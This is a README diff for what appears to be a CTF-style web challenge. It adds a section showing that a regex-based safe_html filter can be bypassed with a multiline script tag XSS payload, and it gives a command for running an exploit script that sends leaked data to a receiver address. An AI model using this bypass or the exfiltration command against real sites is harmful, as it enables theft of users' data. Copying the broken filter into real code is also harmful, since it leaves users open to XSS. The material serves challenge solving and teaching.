@@ -41,6 +41,38 @@ pnpm start
 > [!NOTE]
 > The default runtime is not [Node.js](https://nodejs.org/) but [bun.sh](https://bun.sh). Just replace `start` scripts in [package.json](package.json) to meet your preference.
 
+## Exploit
+
+Analyze the `safe_html` function in [src/page.ts](src/page.ts).
+
+```typescript
+function safe_html(str: string) {
+    return str
+        .replace(/<.*>/igm, '')
+        .replace(/<\.*>/igm, '')
+        .replace(/<.*>.*<\/.*>/igm, '')
+}
+```
+
+It's easy to bypass the filter, because the `m` flag disables matching the newline character, it matches multiline splitly.
+
+```html
+<script
+>alert(1)</script
+>
+```
+
+The exploit script is provided on [exploit/exp.ts](exploit/exp.ts). Please run it with bun.
+
+```bash
+bun exp.py '172.18.0.2:8000' -r '192.168.16.10:5555' -p '5555'
+# `-r` means the address which receive the XSS leaked data
+# `-p` means the port of the address on local machine
+# Note that the exploit script has to be run on the receiver machine.
+```
+
+For more details, please use `--help` to get more information about this exploit script.
+
 ## License
 
 Copyright (c) Cnily03. All rights reserved.
